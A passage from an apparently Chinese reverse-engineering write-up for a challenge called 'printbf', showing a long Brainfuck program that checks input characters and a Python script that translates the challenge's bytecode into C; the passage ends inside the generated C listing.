lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-]++++++++++++++++++++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;[-]]&gt;[&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;[-]]&gt;[&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;[-]]&gt;[&gt;&gt;&gt;+&lt;&lt;&lt;[-]]&gt;[&gt;&gt;+&lt;&lt;[-]]&gt;[&gt;+&lt;[-]]&gt;&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;[-]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;[-]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;[-]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;[-]++++++++++++++++++++++++++++++++++++++++++++++++&gt;[-]++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;[-]+++++++++++++++++++++++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-]]&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-]]&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-]]&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-]]&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-]]&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-]]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;.</span><br></pre></td></tr></table></figure><p>进一步的，为了方便甚至可以直接转化成c程序，最后的处理脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="string">b&#x27;&#x27;</span> <span class="comment">#依旧是太长不贴（</span></span><br><span class="line">progn=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16000</span>,<span class="number">4</span>):</span><br><span class="line">    progn.append(<span class="built_in">int</span>.from_bytes(p[i:i+<span class="number">4</span>],byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line"><span class="comment"># 转化成printbf中的int* progn</span></span><br><span class="line">i=<span class="number">2</span></span><br><span class="line">indent=<span class="number">0</span></span><br><span class="line">ptr=<span class="number">0</span></span><br><span class="line">print(<span class="string">&#x27; &#x27;</span>*indent+<span class="string">&quot;#include &lt;stdio.h&gt;&quot;</span>)</span><br><span class="line">print(<span class="string">&#x27; &#x27;</span>*indent+<span class="string">&quot;int main()&#123;&quot;</span>)</span><br><span class="line">indent+=<span class="number">4</span></span><br><span class="line">print(<span class="string">&#x27; &#x27;</span>*indent+<span class="string">&quot;char mem[1000000]=&#123;0&#125;;&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="built_in">len</span>(progn) <span class="keyword">and</span> progn[i]!=<span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> progn[i]==<span class="number">5</span>:</span><br><span class="line">        print(<span class="string">&#x27; &#x27;</span>*indent+<span class="string">&quot;printf(\&quot;%c\&quot;,mem[&quot;</span>+<span class="built_in">str</span>(ptr)+<span class="string">&quot;]);&quot;</span>)</span><br><span class="line">        i+=<span class="number">4</span></span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">7</span>:</span><br><span class="line">        print(<span class="string">&#x27; &#x27;</span>*indent+<span class="string">&quot;scanf(\&quot;%c\&quot;,&amp;mem[&quot;</span>+<span class="built_in">str</span>(ptr)+<span class="string">&quot;]);&quot;</span>)</span><br><span class="line">        i+=<span class="number">4</span></span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">9</span>:</span><br><span class="line">        print(<span class="string">&#x27; &#x27;</span>*indent+<span class="string">&quot;while(mem[&quot;</span>+<span class="built_in">str</span>(ptr)+<span class="string">&quot;])&#123;&quot;</span>)</span><br><span class="line">        indent+=<span class="number">4</span></span><br><span class="line">        i+=<span class="number">6</span></span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">12</span>:</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">        indent-=<span class="number">4</span></span><br><span class="line">        print(<span class="string">&#x27; &#x27;</span>*indent+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">13</span>:</span><br><span class="line">        print(<span class="string">&#x27; &#x27;</span>*indent+<span class="string">&quot;mem[&quot;</span>+<span class="built_in">str</span>(ptr)+<span class="string">&quot;]=0;&quot;</span>)</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">14</span>:</span><br><span class="line">        ptr+=progn[i+<span class="number">1</span>]</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">15</span>:</span><br><span class="line">        ptr-=(<span class="number">65536</span>-progn[i+<span class="number">1</span>])</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> progn[i]==<span class="number">18</span>:</span><br><span class="line">        <span class="comment"># 其实这里+和-没法准确区分，且对于无符号char型数据来说-n和+(256-n)得到的结果是一样的，这里选择字符数更少的操作符</span></span><br><span class="line">        <span class="keyword">if</span> progn[i+<span class="number">1</span>]&gt;<span class="number">0x7F</span>:</span><br><span class="line">            print(<span class="string">&#x27; &#x27;</span>*indent+<span class="string">&quot;mem[&quot;</span>+<span class="built_in">str</span>(ptr)+<span class="string">&quot;]-=&quot;</span>+<span class="built_in">str</span>(<span class="number">256</span>-progn[i+<span class="number">1</span>])+<span class="string">&quot;;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27; &#x27;</span>*indent+<span class="string">&quot;mem[&quot;</span>+<span class="built_in">str</span>(ptr)+<span class="string">&quot;]+=&quot;</span>+<span class="built_in">str</span>(progn[i+<span class="number">1</span>])+<span class="string">&quot;;&quot;</span>)</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[-] UknCode &quot;</span>+<span class="built_in">str</span>(progn[i])+<span class="string">&quot; in progn[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&quot;</span>)</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">print(<span class="string">&#x27; &#x27;</span>*indent+<span class="string">&quot;return 0;&quot;</span>)</span><br><span class="line">indent-=<span class="number">4</span></span><br><span class="line">print(<span class="string">&#x27; &#x27;</span>*indent+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="comment"># 直接转化成C程序</span></span><br></pre></td></tr></table></figure><p>得到C程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span 